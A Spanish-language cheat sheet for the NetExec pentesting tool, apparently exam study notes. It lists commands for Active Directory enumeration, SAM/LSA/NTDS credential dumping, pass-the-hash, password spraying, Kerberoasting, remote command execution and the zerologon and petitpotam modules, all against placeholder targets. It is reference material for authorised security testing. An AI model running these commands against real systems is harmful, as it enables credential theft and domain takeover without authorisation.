# Chuleta — NetExec 1.5.1

> `nxc` funciona directo (resuelve a `/usr/bin/nxc`, NetExec 1.5.1). El shim roto ya no existe.
> Ver `../guia/verificado-2026.md`.

---

## Sintaxis general

```text
nxc <protocolo> <objetivo> [opciones de conexión] [opciones de acción]
```

| Protocolo | Uso principal |
| --- | --- |
| `smb` | Shares, usuarios, SAM/LSA, spraying |
| `ldap` | AD: usuarios, grupos, Kerberoasting, BloodHound |
| `winrm` | Shell en Windows con credenciales válidas |
| `mssql` | SQL Server, `xp_cmdshell` |
| `rdp` | Validar credenciales de RDP |
| `ftp` / `ssh` | Servicios sueltos |

### Opciones de conexión

| Flag | Significado |
| --- | --- |
| `-u <user>` | Usuario, o `-u usuarios.txt` para lista |
| `-p <pass>` | Contraseña, o lista |
| `-H <hash>` | Hash NTLM (Pass-the-Hash) |
| `-d <dominio>` | Dominio |
| `--local-auth` | Autenticación local en vez de dominio |
| `-k` | Kerberos |
| `--use-kcache` | Usar el `.ccache` del entorno |
| `-id <user> <pass>` | Credencial para Kerberoasting/ASREP |
| `--continue-on-success` | Seguir probando tras un acierto (importantísimo en spraying) |
| `--no-bruteforce` | Probar solo pares usuario:pass del mismo índice |

---

## SMB

```bash
# Reconocimiento inicial
/usr/bin/nxc smb <IP>
/usr/bin/nxc smb <IP> -u '' -p ''                        # null session
/usr/bin/nxc smb <IP> -u 'guest' -p ''                   # guest

# Con credenciales
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --shares
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --users
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --groups
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --local-groups
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --computers
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --pass-pol
/usr/bin/nxc smb <IP> -u user -p pass -d dominio.local --loggedon-users

# Enumerar usuarios por RID (funciona cuando LDAP no responde)
/usr/bin/nxc smb <IP> -u user -p pass --rid-brute

# Dumps
/usr/bin/nxc smb <IP> -u user -p pass --sam
/usr/bin/nxc smb <IP> -u user -p pass --lsa
/usr/bin/nxc smb <IP> -u user -p pass --ntds
/usr/bin/nxc smb <IP> -u user -p pass --local-auth --sam --lsa

# Pass-the-Hash
/usr/bin/nxc smb <IP> -u Administrator -H <NThash>

# Ejecutar comandos (requiere admin local)
/usr/bin/nxc smb <IP> -u user -p pass -x 'whoami'
/usr/bin/nxc smb <IP> -u user -p pass -X 'Get-Process'      # PowerShell

# Exploración de shares
/usr/bin/nxc smb <IP> -u user -p pass --spider share --pattern "passw"

# Hosts sin firma SMB (candidatos a relay)
/usr/bin/nxc smb <IP> -u user -p pass --gen-relay-list relay.txt

# Password spraying
/usr/bin/nxc smb <IP> -u usuarios.txt -p 'Password123!' -d dominio.local \
                     --continue-on-success
```

---

## LDAP — donde está el valor del AD

```bash
# Enumeración
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --users
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --groups
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --computers
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --pass-pol
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --active-users
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --password-not-required
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --admin-count
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --get-sid

# Delegación
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --find-delegation
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --trusted-for-delegation

# Consulta LDAP cruda
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local \
        --query "(objectClass=user)" "sAMAccountName" "description"

# Ataques de credenciales
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --kerberoasting kerb.txt
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --asreproast asrep.txt
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --kerberoasting --kerberoast-account svc_sql

# BloodHound
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local \
        --bloodhound --collection All --dns-server <IP>

# gMSA
/usr/bin/nxc ldap <IP> -u user -p pass -d dominio.local --gmsa
```

---

## WinRM — shell de verdad

```bash
/usr/bin/nxc winrm <IP> -u user -p pass -d dominio.local
/usr/bin/nxc winrm <IP> -u user -p pass -d dominio.local -x 'whoami'
/usr/bin/nxc winrm <IP> -u user -p pass -d dominio.local -X 'Get-Process'
/usr/bin/nxc winrm <IP> -u Administrator -H <NThash> -d dominio.local

# Con Kerberos
/usr/bin/nxc winrm <IP> -u user -p pass -d dominio.local -k --use-kcache
```

Si `nxc winrm` valida, `evil-winrm` te da shell interactiva:

```bash
evil-winrm -i <IP> -u user -p 'pass'
evil-winrm -i <IP> -u user -H <NThash>
```

---

## MSSQL

```bash
/usr/bin/nxc mssql <IP> -u user -p pass -d dominio.local
/usr/bin/nxc mssql <IP> -u user -p pass -d dominio.local -q "SELECT @@version"
/usr/bin/nxc mssql <IP> -u user -p pass -d dominio.local -x 'whoami'
/usr/bin/nxc mssql <IP> -u user -p pass -d dominio.local --local-auth

# Con hash
/usr/bin/nxc mssql <IP> -u sa -H <NThash> --local-auth

# Archivos
/usr/bin/nxc mssql <IP> -u user -p pass --put-file archivo.txt C:\\Temp\\archivo.txt
/usr/bin/nxc mssql <IP> -u user -p pass --get-file C:\\Temp\\flag.txt flag.txt
```

---

## RDP / FTP / SSH

```bash
/usr/bin/nxc rdp <IP> -u user -p pass -d dominio.local
/usr/bin/nxc ftp <IP> -u anonymous -p ''
/usr/bin/nxc ssh <IP> -u root -p pass
```

---

## Módulos

```bash
/usr/bin/nxc <proto> -L                 # listar módulos
/usr/bin/nxc <proto> -M <modulo> -o    # opciones del módulo
```

> **Estado actual**: `nxc smb -L` y `nxc ldap -L` **fallan** por un desajuste de esquema en la
> base de datos del workspace. Ver `../guia/verificado-2026.md` para el fix.

Módulos útiles para AD:

```bash
/usr/bin/nxc smb <DC> -u user -p pass -M gpp_password
/usr/bin/nxc smb <DC> -u user -p pass -M gpp_autologin
/usr/bin/nxc smb <DC> -u user -p pass -M zerologon
/usr/bin/nxc smb <DC> -u user -p pass -M petitpotam
/usr/bin/nxc smb <DC> -u '' -p '' -M zerologon
/usr/bin/nxc ldap <DC> -u user -p pass -M maq          # MachineAccountQuota
```

---

## Notas de comportamiento

### La política de bloqueo manda

**Antes de cualquier spraying**:

```bash
/usr/bin/nxc smb <DC> -u user -p pass -d dominio.local --pass-pol
```

Si el umbral es bajo (3 o menos), **no hagas spraying**. Bloqueás cuentas del examen.

### La DB del workspace

NetExec guarda credenciales y hosts encontrados en `~/.nxc/workspaces/default/`. Eso es útil:
si te olvidás qué contraseña ya probaste, está ahí. Pero si ves el error de *schema mismatch*,
las credenciales no se están guardando — arreglalo antes.

### `--continue-on-success` no es opcional en spraying

Sin ese flag, NetExec **corta en el primer acierto** y te perdés todas las demás cuentas que
compartían esa contraseña. Es el error más común con esta herramienta.
